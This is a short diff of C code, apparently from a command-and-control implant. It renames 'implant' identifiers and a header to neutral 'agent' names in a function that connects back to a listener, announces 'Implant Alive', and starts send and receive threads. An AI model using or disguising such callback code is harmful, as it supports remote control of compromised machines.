@@ -10,7 +10,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#include "implant_transmit.h"
+#include "agent_comms.h"
 
 #define BUFFER_SIZE 256
 
@@ -21,7 +21,7 @@ int connect_to_listener(char* ip_addr, int port){
     char* buffer;
     char* message = "Implant Alive\n";
     struct sockaddr_in addr;
-    pthread_t implant_receive_tid, implant_send_tid;
+    pthread_t agent_receive_tid, agent_send_tid;
 
     if (ip_addr == NULL || !port){
         printf("Bad IP or port\n");
@@ -48,12 +48,12 @@ int connect_to_listener(char* ip_addr, int port){
     }
     
     // Start agent receive thread
-    pthread_create(&implant_receive_tid, NULL, implant_receive, &sockfd);
+    pthread_create(&agent_receive_tid, NULL, agent_receive, &sockfd);
     // Start agent send thread
-    pthread_create(&implant_send_tid, NULL, implant_send, &sockfd);
+    pthread_create(&agent_send_tid, NULL, agent_send, &sockfd);
     
-    pthread_join(implant_receive_tid, NULL);
-    pthread_join(implant_send_tid, NULL);
+    pthread_join(agent_receive_tid, NULL);
+    pthread_join(agent_send_tid, NULL);
 
     close(sockfd);
     return 0;
